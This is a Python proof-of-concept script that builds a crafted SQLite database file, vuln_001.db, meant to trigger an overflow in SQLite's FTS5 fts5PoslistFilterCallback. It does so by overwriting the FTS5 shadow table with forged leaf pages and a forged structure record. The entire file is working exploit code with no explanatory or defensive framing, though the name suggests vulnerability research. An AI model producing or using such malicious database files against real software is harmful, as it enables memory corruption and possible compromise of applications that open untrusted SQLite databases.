"""Build a malicious FTS5 db that triggers fts5PoslistFilterCallback overflow."""
import sqlite3, struct, os

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.db")

def put_varint32(v):
if v < 0x80:    return bytes([v])
if v < 0x4000:  return bytes([0x80|(v>>7), v&0x7F])
if v < 0x200000: return bytes([0x80|(v>>14), 0x80|((v>>7)&0x7F), v&0x7F])
if v < 0x10000000:
return bytes([0x80|(v>>21), 0x80|((v>>14)&0x7F), 0x80|((v>>7)&0x7F), v&0x7F])
return bytes([0x80|(v>>28), 0x80|((v>>21)&0x7F), 0x80|((v>>14)&0x7F),
0x80|((v>>7)&0x7F), v&0x7F])

def get_varint32(data, offset):
v = 0; i = offset
while True:
b = data[i]
if b & 0x80: v = (v<<7) | (b&0x7F); i += 1
else:        v = (v<<7) | b;        i += 1; break
return v, i

def fts5_dri(segid, dlidx, height, pgno):
return (segid<<37) + (dlidx<<36) + (height<<31) + pgno

def parse_segid(data):
# Skip 4-byte cookie + nLevel + nSegment + writeCounter + nMerge(level0) + nSeg(level0)
i = 4
for _ in range(5): _, i = get_varint32(data, i)
segid, _ = get_varint32(data, i)
return segid

def build_page1():
term = b"0hello"
# term_size, term, rowid=1, poslist_size(nSz=4 i.e. nPos=2), 1 poslist byte
data = bytes([len(term)]) + term + bytes([0x01, 0x04, 0x04])
first_rowid_off = 4 + 1 + len(term)        # 11
iLeafOffset = first_rowid_off + 2          # 13
szLeaf = iLeafOffset + 1                   # 14, only 1 byte of poslist on this page
page_index = bytes([0x04])
return struct.pack(">HH", first_rowid_off, szLeaf) + data + page_index

def build_page2(size=1000):
# Termless continuation page: szLeaf=size, 4-byte header then size-4 bytes of 0x80
return struct.pack(">HH", 0, size) + bytes([0x80] * (size - 4))

def build_structure_record(segid, pgno_first, pgno_last):
return (b"\x00\x00\x00\x00"
+ put_varint32(1) + put_varint32(1) + put_varint32(1)  # nLevel, nSegment, writeCounter
+ put_varint32(0) + put_varint32(1)                    # level0 nMerge, nSeg
+ put_varint32(segid) + put_varint32(pgno_first) + put_varint32(pgno_last))

def main():
if os.path.exists(DB_PATH): os.unlink(DB_PATH)
conn = sqlite3.connect(DB_PATH); cur = conn.cursor()
cur.execute("CREATE VIRTUAL TABLE t USING fts5(a, b)")
cur.execute("INSERT INTO t(rowid, a, b) VALUES(1, 'hello world', 'foo bar')")
conn.commit()
struct_block = cur.execute("SELECT block FROM t_data WHERE id=10").fetchone()[0]
segid = parse_segid(struct_block)
cur.execute("UPDATE t_data SET block=? WHERE id=?",
(build_page1(), fts5_dri(segid, 0, 0, 1)))
cur.execute("INSERT OR REPLACE INTO t_data(id, block) VALUES(?, ?)",
(fts5_dri(segid, 0, 0, 2), build_page2(1000)))
cur.execute("UPDATE t_data SET block=? WHERE id=10",
(build_structure_record(segid, 1, 2),))
conn.commit(); conn.close()
print(f"Wrote {DB_PATH}")

if __name__ == "__main__":
main()

